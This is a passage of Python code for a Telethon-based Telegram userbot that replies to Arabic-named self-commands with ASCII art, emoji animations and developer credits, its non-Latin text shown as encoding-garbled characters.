            "YO·ëå·ñá ·ó∑·ñá·ó©I·ëé ‚û°Ô∏è üß†\n\n    (> ^_^)>üß†     üóë",
            "YO·ëå·ñá ·ó∑·ñá·ó©I·ëé ‚û°Ô∏è üß†\n\n        (> ^_^)>üß† üóë",
            "YO·ëå·ñá ·ó∑·ñá·ó©I·ëé ‚û°Ô∏è üß†\n\n           (> ^_^)>üóë",
            "YO·ëå·ñá ·ó∑·ñá·ó©I·ëé ‚û°Ô∏è üß†\n\n           <(^_^ <)üóë"
        ]

        
        message = await client.send_message(event.chat_id, message_texts[0])

        
        for text in message_texts[1:]:
            await asyncio.sleep(1)
            await message.edit(text)
            
    except Exception as e:
        await client.send_message(event.chat_id, f"‚ö†Ô∏è ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£: {e}")

@client.on(events.NewMessage(from_users='me', pattern='.ÿ™ÿ±ÿ≠Ÿäÿ®'))
async def send_welcome_message(event):
    await event.delete()
    welcome_message = """
‚îÄ‚îÄ‚îÄ‚ñÑ‚ñÄ‚ñÄ‚ñÄ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÄ‚ñÄ‚ñÄ‚ñÑ‚îÄ‚îÄ‚îÄ
‚îÄ‚îÄ‚îÄ‚ñà‚ñí‚ñí‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñí‚ñí‚ñà‚îÄ‚îÄ‚îÄ
‚îÄ‚îÄ‚îÄ‚îÄ‚ñà‚ñë‚ñë‚ñà‚ñë‚ñë‚ñë‚ñë‚ñë‚ñà‚ñë‚ñë‚ñà‚îÄ‚îÄ‚îÄ‚îÄ
‚îÄ‚ñÑ‚ñÑ‚îÄ‚îÄ‚ñà‚ñë‚ñë‚ñë‚ñÄ‚ñà‚ñÄ‚ñë‚ñë‚ñë‚ñà‚îÄ‚îÄ‚ñÑ‚ñÑ‚îÄ
‚ñà‚ñë‚ñë‚ñà‚îÄ‚ñÄ‚ñÑ‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñÑ‚ñÄ‚îÄ‚ñà‚ñë‚ñë‚ñà
‚ñà‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñà
‚ñà‚ñë‚ñë‚ï¶‚îÄ‚ï¶‚ïî‚ïó‚ï¶‚îÄ‚ïî‚ïó‚ïî‚ïó‚ïî‚ï¶‚ïó‚ïî‚ïó‚ñë‚ñë‚ñà
‚ñà‚ñë‚ñë‚ïë‚ïë‚ïë‚ï†‚îÄ‚ïë‚îÄ‚ïë‚îÄ‚ïë‚ïë‚ïë‚ïë‚ïë‚ï†‚îÄ‚ñë‚ñë‚ñà
‚ñà‚ñë‚ñë‚ïö‚ï©‚ïù‚ïö‚ïù‚ïö‚ïù‚ïö‚ïù‚ïö‚ïù‚ï©‚îÄ‚ï©‚ïö‚ïù‚ñë‚ñë‚ñà
‚ñà‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñà
"""
    await event.reply(welcome_message)

@client.on(events.NewMessage(from_users='me', pattern='.ŸÜÿßÿØŸÖ'))
async def send_welcome_message(event):
    await event.delete()
    welcome_message = """
‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚°ø‚†ø‚†õ‚†ã‚†â‚°â‚£â‚°õ‚£õ‚†ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø
‚£ø‚£ø‚£ø‚°ø‚†ã‚†Å‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚¢Ä‚£∏‚£ø‚£ø‚°ø‚†ø‚°Ø‚¢ô‚†ø‚£ø‚£ø‚£ø‚£ø
‚£ø‚£ø‚°ø‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚°Ä‚°Ä‚†Ñ‚¢Ä‚£Ä‚£â‚£â‚£â‚†Å‚†ê‚£∂‚£∂‚£ø‚£ø‚£ø‚£ø
‚£ø‚£ø‚°á‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†Å‚£ø‚£ø‚£Ä‚†à‚†ø‚¢ü‚°õ‚†õ‚£ø‚†õ‚†õ‚£ø‚£ø‚£ø‚£ø‚£ø
‚£ø‚£ø‚°Ü‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†à‚†Å‚†∞‚£Ñ‚£¥‚°¨‚¢µ‚£¥‚£ø‚£§‚£Ω‚£ø‚£ø‚£ø‚£ø‚£ø
‚£ø‚£ø‚°á‚†Ñ‚¢Ä‚¢Ñ‚°Ä‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚°â‚†ª‚£ø‚°ø‚†Å‚†ò‚†õ‚°ø‚£ø‚£ø‚£ø‚£ø‚£ø
‚£ø‚°ø‚†É‚†Ñ‚†Ñ‚†à‚†ª‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚¢ò‚£ß‚£Ä‚†æ‚†ø‚†∂‚†¶‚¢≥‚£ø‚£ø‚£ø‚£ø‚£ø
‚£ø‚£∂‚£§‚°Ä‚¢Ä‚°Ä‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†ª‚¢£‚£∂‚°í‚†∂‚¢§‚¢æ‚£ø‚£ø‚£ø‚£ø‚£ø
‚£ø‚°ø‚†ã‚†Ñ‚¢ò‚£ø‚£¶‚°Ä‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†â‚†õ‚†ª‚†ª‚†∫‚£º‚£ø‚†ü‚†õ‚†ø‚£ø
‚†ã‚†Å‚†Ñ‚†Ñ‚†Ñ‚¢ª‚£ø‚£ø‚£∂‚£Ñ‚°Ä‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚¢Ä‚£§‚£æ‚£ø‚°Ä‚†Ñ‚†Ñ‚†Ñ‚¢π
‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚¢ª‚£ø‚£ø‚£ø‚£∑‚°§‚†Ñ‚†∞‚°Ü‚†Ñ‚†Ñ‚†à‚†õ‚¢¶‚£Ä‚°Ä‚°Ä‚†Ñ
‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†à‚¢ø‚£ø‚†ü‚°ã‚†Ñ‚†Ñ‚†Ñ‚¢£‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†à‚†π‚£ø‚£Ä
‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†ò‚£∑‚£ø‚£ø‚£∑‚†Ñ‚†Ñ‚¢∫‚£á‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†∏‚£ø
‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†π‚£ø‚£ø‚°á‚†Ñ‚†Ñ‚†∏‚£ø‚°Ñ‚†Ñ‚†à‚†Å‚†Ñ‚†Ñ‚†Ñ‚£ø
‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚¢ª‚£ø‚°á‚†Ñ‚†Ñ‚†Ñ‚¢π‚£ß‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†ò
"""
    await event.reply(welcome_message)
    
@client.on(events.NewMessage(pattern=f"\.ŸÇŸÜÿ®ŸÑÿ©$", outgoing=True))
async def bombs(event):
    if event.fwd_from:
        return
    await event.edit("‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è \n‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è \n‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è \n‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è \n‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è \n")
    await asyncio.sleep(0.5)
    await event.edit("üí£üí£üí£üí£ \n‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è \n‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è \n‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è \n‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è \n")
    await asyncio.sleep(0.5)
    await event.edit("‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è \nüí£üí£üí£üí£ \n‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è \n‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è \n‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è \n")
    await asyncio.sleep(0.5)
    await event.edit("‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è \n‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è \nüí£üí£üí£üí£ \n‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è \n‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è \n")
    await asyncio.sleep(0.5)
    await event.edit("‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è \n‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è \n‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è \nüí£üí£üí£üí£ \n‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è \n")
    await asyncio.sleep(0.5)
    await event.edit("‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è \n‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è \n‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è \n‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è \nüí£üí£üí£üí£ \n")
    await asyncio.sleep(1)
    await event.edit("‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è \n‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è \n‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è \n‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è \nüí•üí•üí•üí• \n")
    await asyncio.sleep(0.5)
    await event.edit("‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è \n‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è \n‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è \nüí•üí•üí•üí• \nüí•üí•üí•üí• \n")
    await asyncio.sleep(0.5)
    await event.edit("‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è \n‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è \n‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è \n‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è‚ñ™Ô∏è \nüòµüòµüòµüòµ \n")
    await asyncio.sleep(0.5)
    await event.edit("`RIP PLOXXX......`")
    await asyncio.sleep(2)
   
@client.on(events.NewMessage(from_users='me', pattern='.ÿ≥ÿ®ŸàŸÜÿ¨ ÿ®Ÿàÿ®'))
async def send_welcome_message(event):
    await event.delete()
    welcome_message = """
   ‚ï±‚ñî‚ñî‚ñî‚ñî‚ñî‚ñî‚ñî‚ñî‚ñî‚ñî‚ñî‚ñè
‚ï±‚ï≠‚ñè‚ïÆ‚ï≠‚îª‚îª‚ïÆ‚ï≠‚îª‚îª‚ïÆ ‚ï≠‚ñè 
‚ïÆ‚ï∞‚ñè‚ïØ‚îÉ‚ï≠‚ïÆ‚îÉ‚îÉ‚ï≠‚ïÆ‚îÉ ‚ï∞‚ñè 
‚ïØ‚îà‚ñè‚îà‚îó‚îª‚îª‚îõ‚îó‚îª‚îª‚îª‚ïÆ ‚ñè 
‚ï≠‚ïÆ‚ñè‚ïÆ‚îà‚îà‚îà‚îà‚îè‚îÅ‚îÅ‚îÅ‚ïØ ‚ñè
‚ï∞‚ïØ‚ñè‚ïØ‚ï∞‚î≥‚î≥‚î≥‚î≥‚î≥‚î≥‚ïØ ‚ï≠‚ñè
‚îà‚ï≠‚ñè‚ï≠‚ïÆ‚îÉ‚îó‚îõ‚îó‚îõ‚îÉ‚îà ‚ï∞‚ñè 
‚îà‚ï∞‚ñè‚ï∞‚ïØ‚ï∞‚îÅ‚îÅ‚îÅ‚îÅ‚ïØ‚îà‚îà ‚ñèI'm ÿ≥ÿ®ŸÄŸàŸÜŸÄÿ¨ ÿ®ŸÄŸÄŸàÿ®
"""
    await event.reply(welcome_message)

@client.on(events.NewMessage(from_users='me', pattern='.ÿµÿØŸÖŸá'))
async def send_welcome_message(event):
    await event.delete()
    welcome_message = """
‚£ø‚£ø‚£ø‚°á‚†Ñ‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø
‚£ø‚£ø‚£ø‚°á‚†Ñ‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø
‚£ø‚£ø‚£ø‚°á‚†Ñ‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø
‚£ø‚£ø‚£ø‚°á‚†Ñ‚£ø‚£ø‚£ø‚°ø‚†ã‚£â‚£â‚£â‚°ô‚†ª‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø
‚£ø‚£ø‚£ø‚†É‚†Ñ‚†π‚†ü‚£°‚£∂‚¢ü‚£õ‚£õ‚°ª‚¢ø‚£¶‚£©‚£§‚£¨‚°â‚¢ª‚£ø‚£ø‚£ø‚£ø
‚£ø‚£ø‚£ø‚†Ñ‚¢Ä‚¢§‚£æ‚£ø‚£ø‚£ø‚°ø‚†ø‚†ø‚†ø‚¢Æ‚°É‚£õ‚°ª‚¢ø‚†à‚£ø‚£ø‚£ø‚£ø
‚£ø‚°ü‚¢°‚£¥‚£Ø‚£ø‚£ø‚£ø‚†§‚£§‚£≠‚£∂‚£∂‚£∂‚£Æ‚£î‚°à‚†õ‚¢ì‚†¶‚†à‚¢ª‚£ø‚£ø
‚†è‚£†‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£Ø‚°™‚¢õ‚†ø‚¢ø‚£ø‚£ø‚£ø‚°ø‚£º‚£ø‚£ø‚£Æ‚£Ñ‚†ô‚£ø
‚£º‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£∑‚£æ‚°≠‚†¥‚£∂‚£∂‚£Ω‚£Ω‚£õ‚°ø‚†ø‚†ø‚†á‚£ø
‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚†ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£∑‚£ù‚£õ‚¢õ‚¢ã‚£•‚£¥‚£ø‚£ø
‚£ø‚£ø‚£ø‚£ø‚£ø‚¢ø‚†±‚£ø‚£õ‚†æ‚£≠‚£õ‚°ø‚¢ø‚£ø‚£ø‚£ø‚£ø‚£ø‚°Ä‚£ø‚£ø‚£ø‚£ø
 ‚†Ω‚°ª‚¢ø‚£Æ‚£Ω‚£∑‚£∂‚£Ø‚£Ω‚£≥‚†Æ‚£Ω‚£ü‚£≤‚†Ø‚¢≠‚£ø‚£õ‚°á‚£ø‚£ø‚£ø‚£ø
‚†Ñ‚†Ñ‚†à‚†ë‚†ä‚†â‚†ü‚£ª‚†ø‚£ø‚£ø‚£ø‚£∑‚£æ‚£≠‚£ø‚†∑‚†∂‚†Ç‚£¥‚£ø‚£ø‚£ø‚£ø
‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†Å‚†ô‚†í‚†ô‚†Ø‚†ç‚†ô‚¢â‚£°‚£∂‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø
‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†Ñ‚†ô‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø
"""
    await event.reply(welcome_message)
    

@client.on(events.NewMessage(from_users='me', pattern='.ÿ∑ÿßÿ¶ÿ±Ÿá'))
async def send_welcome_message(event):
    await event.delete()
    welcome_message = """
    üî≤ ‚ñ¨‚ñ¨‚ñ¨.‚óô.‚ñ¨‚ñ¨‚ñ¨ üî≥
            ‚ïê‚ñÇ‚ñÑ‚ñÑ‚ñì‚ñÑ‚ñÑ‚ñÇ 
           ‚ó¢‚ó§    ‚ñà‚ñÄ‚ñÄ‚ñà‚ñà‚ñà‚ñà‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ó¢‚ó§ 
           ‚ñà‚ñÑ ‚ñà ‚ñà‚ñÑ ‚ñà‚ñà‚ñà‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ï¨
           ‚ó•‚ñà‚ñà‚ñà‚ñà‚ñà‚ó§ 
             ‚ïê‚ïê‚ï©‚ïê‚ïê‚ï©‚ïê‚ïê 
                      ‚ï¨‚ïê‚ï¨ 
                      ‚ï¨‚ïê‚ï¨     
                      ‚ï¨‚ïê‚ï¨ ‚òª/ 
                      ‚ï¨‚ïê‚ï¨/‚ñå 
                      ‚ï¨‚ïê‚ï¨//\"""
"""
    await event.reply(welcome_message)

@client.on(events.NewMessage(from_users='me', pattern='.ÿ®Ÿàÿ≥Ÿá'))
async def send_welcome_message(event):
    await event.delete()
    welcome_message = """
‚î≥‚îª‚î≥‚îª‚ï≠‚îÅ‚îÅ‚îÅ‚îÅ‚ïÆ‚ï±‚ñî‚ñî‚ñî‚ï≤
‚îª‚î≥‚îª‚î≥‚îÉ‚ïØ‚ïØ‚ï≠‚îÅ‚î´‚ñè‚ï∞‚ï∞‚ï∞‚ñï
‚î≥‚îª‚î≥‚îª‚îÉ‚ïØ‚ïØ‚îÉ‚ñî‚ï∞‚îì‚ñî‚ñÇ‚ñî‚ñï‚ïÆ
‚îª‚î≥‚îª‚î≥‚ï∞‚ïÆ‚ïØ‚îÉ‚îà‚ï∞‚î´‚ï∞‚îÅ‚ïØ‚îè‚ïØ
‚î≥‚îª‚î≥‚îª‚îè‚ïØ‚ïØ‚îÉ‚ï≠‚îÅ‚ïØ‚î≥‚îÅ‚î≥‚ïØ
‚îª‚î≥‚îª‚î≥‚ï∞‚îÅ‚î≥‚ïØ‚ñî‚ï≤‚ï±‚ñî‚ï≠‚ïÆ‚ñî‚ï≤
‚î≥‚îª‚î≥‚îª‚î≥‚îª‚îÉ‚îà‚ï≤‚îà‚ï≤‚ï±‚ï≠‚ïØ‚ïÆ‚ñï
‚îª‚î≥‚îª‚î≥‚îª‚î≥‚îÉ‚îà‚ñï‚ï≤‚ñÇ‚ï±‚îà‚ï≠‚ïØ‚ï±
‚î≥‚îª‚î≥‚îª‚î≥‚îª‚îÉ'''‚îà‚îÉ‚îà‚îÉ‚îà'''‚ï∞‚ïØ
‚îª‚î≥‚îª‚î≥‚îª‚îè‚ïØ‚ñî'''‚ï∞‚îì‚î£‚îÅ‚î≥‚î´
‚î≥‚îª‚î≥‚îª‚î≥‚ï∞‚î≥‚î≥‚î≥'''‚ïØ‚îÉ‚îà‚îÉ‚îÉ
‚îª‚î≥‚îª‚î≥‚îª‚î≥‚îÉ‚îÉ‚îÉ‚îà'''‚îÉ‚îà‚îÉ‚îÉ
‚î≥‚îª‚î≥‚îª‚î≥‚îª‚îÉ‚îÉ‚îÉ'''‚îä‚îÉ‚îà‚îÉ‚îÉ
‚îª‚î≥‚îª‚î≥‚îª‚î≥‚îÉ‚îÉ‚îÉ‚îà'''‚îÉ‚îà‚îÉ‚îÉ
‚î≥‚îª‚î≥‚îª‚î≥‚îª‚î£‚ïã‚î´'''‚îä‚î£‚îÅ‚ïã‚î´
‚îª‚î≥‚îª‚î≥‚îª‚ï≠‚ïØ‚ï∞‚ï∞-‚ï≠‚ïØ‚îÅ‚ïØ.''‚ï∞‚ïÆ
"**I Love You üíï** 
"""
    await event.reply(welcome_message)

@client.on(events.NewMessage(from_users='me', pattern='.Ÿàÿ≠ÿ¥'))
async def send_welcome_message(event):
    await event.delete()
    welcome_message = """
‚ñÑ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñÑ
‚ñà‚ñÑ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñÑ‚ñà
‚ñà‚ñº‚ñº‚ñº‚ñº‚ñº‚ñà
‚ñà‚ñà________‚ñà‚ñå
‚ñà‚ñ≤‚ñ≤‚ñ≤‚ñ≤‚ñ≤‚ñà
‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà
_‚ñà‚ñà‚ñà‚ñà"""
    await event.reply(welcome_message)

@client.on(events.NewMessage(from_users='me', pattern='.ÿßŸÑŸÖÿ∑Ÿàÿ±'))
async def send_welcome_message(event):
    await event.delete()
    welcome_message = """
·ØìÿßŸÑŸÖÿ∑Ÿàÿ±ŸäŸÜ·Øì

 ìÜ©  ùêàùêòùêÄùêÉ  ìÜ™   @nS_R_T
 
 ìÜ©  ùêëùêàùêé   ìÜ™   @MRM_U
 
·ØìÿßŸÑŸÖÿ∑Ÿàÿ±ŸäŸÜ·Øì
"""
    await event.reply(welcome_message)
    
@client.on(events.NewMessage(from_users='me', pattern='.ÿßŸÑÿ≥Ÿàÿ±ÿ≥'))
async def send_welcome_message(event):
    await event.delete()
    welcome_message = """
üß† ÿ≥Ÿàÿ±ÿ≥ ŸÅŸÑŸäŸÉÿ≥ - FLEX SOURCE

üì° ÿ£ŸÇŸàŸâ ÿ≥Ÿàÿ±ÿ≥ ÿ™ŸäŸÑŸäÿ´ŸàŸÜ ÿ≠ŸÖÿßŸäÿ© ŸàŸÖŸäÿ≤ÿßÿ™ ÿ®Ÿàÿ™ÿßÿ™ ŸÖÿ™ŸÇÿØŸÖÿ©

üîó ÿßÿ∂ÿ∫ÿ∑ ŸáŸÜÿß ŸÑÿ≤Ÿäÿßÿ±ÿ© : https://t.me/source_flex

üõ°ŸÖÿ¨ŸÖŸàÿπÿ© ÿßŸÑÿØÿπŸÖ  :  https://t.me/helper_flex

ÿßŸÑŸÖÿ∑Ÿàÿ±ŸäŸÜ  :  @nS_R_T  |  @MRM_U
"""
    await event.reply(welcome_message)    

@client.on(events.NewMessage(from_users='me', pattern='.ŸÇÿßÿ™ŸÑ'))
async def send_welcome_message(event):
    await event.delete()
    welcome_message = """
_/Ôπã\_
(“Ç`_¬¥)
<,Ô∏ª‚ï¶‚ï§‚îÄ “â - - - ü§Ø
_/Ôπã\_
"""
@client.on(events.NewMessage(from_users='me', pattern='.ÿßÿ≠ÿ®ŸÉ'))
async def send_welcome_message(event):
    await event.delete()
    welcome_message = """
‚ù§Ô∏è I ‚Ä¢ L O V E ‚Ä¢ Y O U
"""
    await event.reply(welcome_message)

@client.on(events.NewMessage(from_users='me', pattern='.ŸÖÿ≥ÿØÿ≥'))
async def send_welcome_message(event):
    await event.delete()
    welcome_message = """
‚ñë‚ñê‚ñà‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñà‚ñÑ
‚ñë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà 
‚ñë‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñà‚ñà‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ó§ 
‚ñë‚ñÄ‚ñë‚ñê‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñå‚ñÄ‚ñà‚ñë‚ñë‚ñë‚ñà‚ñÄ‚ñë
‚ñë‚ñë‚ñë‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñà‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñà‚ñÄ‚ñë‚ñë
‚ñë‚ñë‚ñà‚ñì‚ñì‚ñì‚ñì‚ñì‚ñå‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë
‚ñë‚ñê‚ñà‚ñì‚ñì‚ñì‚ñì‚ñì‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë
‚ñë‚ñê‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñå‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë
"""
    await event.reply(welcome_message)

@client.on(events.NewMessage(from_users='me', pattern='.ŸÉŸÑÿ®'))
async def send_welcome_message(event):
    await event.delete()
    welcome_message = """
‚ï•‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚ï≠‚îÅ‚îÅ‚ïÆ‚îÅ‚îÅ‚î≥
‚ï¢‚ï≠‚ïÆ‚ï≠‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚î´‚îÉ‚ñã‚ñã‚îÅ‚ñÖ‚î£
‚ï¢‚îÉ‚ï∞‚î´‚îà‚îà‚îà‚îà‚îà‚îÉ‚îÉ‚îà‚îà‚ï∞‚î´‚î£
‚ï¢‚ï∞‚îÅ‚î´‚îà‚îà‚îà‚îà‚îà‚ï∞‚ïØ‚ï∞‚î≥‚îÅ‚ïØ‚î£
‚ï¢‚îä‚îä‚îÉ‚îè‚î≥‚î≥‚îÅ‚îÅ‚îì‚îè‚î≥‚î´‚îä‚îä‚î£
‚ï®‚îÅ‚îÅ‚îó‚îõ‚îó‚îõ‚îÅ‚îÅ‚îó‚îõ‚îó‚îõ‚îÅ‚îÅ‚îª
"""
    await event.reply(welcome_message)

@client.on(events.NewMessage(from_users='me', pattern='.ŸáŸÑŸà'))
async def send_welcome_message(event):
    await event.delete()
    welcome_message = """
‚ïî‚îì‚îè‚ï¶‚îÅ‚ï¶‚îì‚ïî‚îì‚ïî‚îÅ‚îÅ‚ïó
‚ïë‚îó‚îõ‚ïë‚îó‚ï£‚îÉ‚ïë‚îÉ‚ïëX X‚ïë
‚ïë‚îè‚îì‚ïë‚îè‚ï£‚îó‚ï£‚îó‚ï£‚ï∞‚ïØ‚ïë
‚ïö‚îõ‚îó‚ï©‚îÅ‚ï©‚îÅ‚ï©‚îÅ‚ï©‚îÅ‚îÅ‚ïù
"""
    await event.reply(welcome_message)

@client.on(events.NewMessage(from_users='me', pattern='.ÿ´ÿπÿ®ÿßŸÜ'))
async def send_welcome_message(event):
    await event.delete()
    welcome_message = """
‚ñë‚ñë‚ñë‚ñë‚ñì
‚ñë‚ñë‚ñë‚ñì‚ñì
‚ñë‚ñë‚ñà‚ñì‚ñì‚ñà
‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
